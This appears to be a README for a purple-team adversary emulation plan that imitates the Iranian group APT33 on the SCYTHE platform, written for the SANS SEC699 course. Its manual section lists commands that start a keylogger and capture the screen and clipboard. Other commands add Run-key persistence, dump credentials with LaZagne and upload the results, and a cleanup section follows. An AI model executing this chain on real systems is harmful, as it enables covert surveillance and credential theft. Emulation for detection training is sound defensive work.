# APT33 Adversary Emulation
APT33, HOLMIUM, Elfin

## Executive Summary
Multiple campaigns emulating APT33 based on this Threat Thursday post: https://www.scythe.io/library/threatthursday-apt33
An additional campaign for SANS SEC699: Purple Team Tactics - Adversary Emulation for Breach Prevention & Detection (https://www.sans.org/cyber-security-courses/purple-team-tactics-adversary-emulation/) is also provided. SANS SEC699 has multiple labs teaching students how to build and run adversary emulation plans. 

## Cyber Threat Intelligence
APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. 

### Targets
The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. 

### Objectives
Establishing persistent access to partners and suppliers of targets. Mounting supply chain attacks.

### Capabalities
Unmanaged PowerShell

## Attack - SEC699 Emulation Plan
This is a multi campaign threat that requires the following steps to be done first:
- Create a new campaign called Shell. It does not need to have automation.
- Download the 64-bit EXE for that campaign as Shell.exe
- 7zip or WinRAR it with password: BearsBeetsBattleStarGalactica
- Upload Shell.zip to VFS:/shared/threats/APT33/

### Automated Emulation
To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/APT33
4. Create a new campaign
5. Import from Existing Threat: APT33_SEC699
6. Launch Campaign

Note that different TTPs will be performed based privilege of the SCYTHE client.

### Manual Emulation
Start a campaign and perform the following steps from a shell:
```
Start (with https, loader, and controller)
loader --load keylogger
keylogger --start
loader --load printscr
printscr --window Desktop
loader --load clipboard
clipboard
loader --load sysinfo
sysinfo
loader --load processes
processes
loader --load services
services --all
loader --load arp
arp
loader --load upsh
upsh --cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
upsh --cmd Get-DnsClientServerAddress
STEP = FROM SEC699
upsh --cmd mkdir -Force $env:userprofile\Desktop\APT33
loader --load downloader
downloader --src VFS:/shared/threats/APT33/Shell.zip --dest %USERPROFILE%\Desktop\APT33\Shell.zip
downloader --src VFS:/shared/threats/APT33/WinRAR.exe --dest %USERPROFILE%\Desktop\APT33\WinRAR.exe
upsh --cmd cd $env:userprofile\Desktop\APT33 ; .\WinRAR.exe x -ibck -pBearsBeetsBattleStarGalactica .\Shell.zip
upsh --cmd cd $env:userprofile\Desktop\APT33 ; Start-Process Shell.exe
controller --integrity
If step 25 does not contain "High" goto step 36
upsh --cmd cp $env:userprofile\Desktop\APT33\Shell.exe C:\Shell.exe
upsh --cmd Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name apt33 -Value C:\Shell.exe
upsh --cmd Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name apt33
downloader --src VFS:/shared/threats/APT33/lazagne.exe --dest %USERPROFILE%\Desktop\APT33\lazagne.exe
upsh --cmd cd $env:userprofile\Desktop\APT33 ; .\lazagne.exe all | Out-File lazagne_results.txt
delay --time 60
upsh --cmd Compress-Archive -Path $env:userprofile\Desktop\APT33\lazagne_results.txt -CompressionLevel Optimal -Destination $env:userprofile\Desktop\APT33\results.zip
loader --load uploader
uploader --remotepath %USERPROFILE%\Desktop\APT33\results.zip
keylogger --current
STEP = CLEANUP
delay --time 3600
keylogger --current
keylogger --stop
upsh --cmd Stop-Process -Name Shell
upsh --cmd cd $env:userprofile\Desktop\ ; Remove-Item APT33 -Force -Recurse
If step 25 does not contain "High" goto step 46
upsh --cmd Remove-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\ -name apt33
upsh --cmd Remove-Item C:\Shell.exe
controller --shutdown
Finish
```

## References
- https://www.scythe.io/library/threatthursday-apt33
- https://attack.mitre.org/groups/G0064/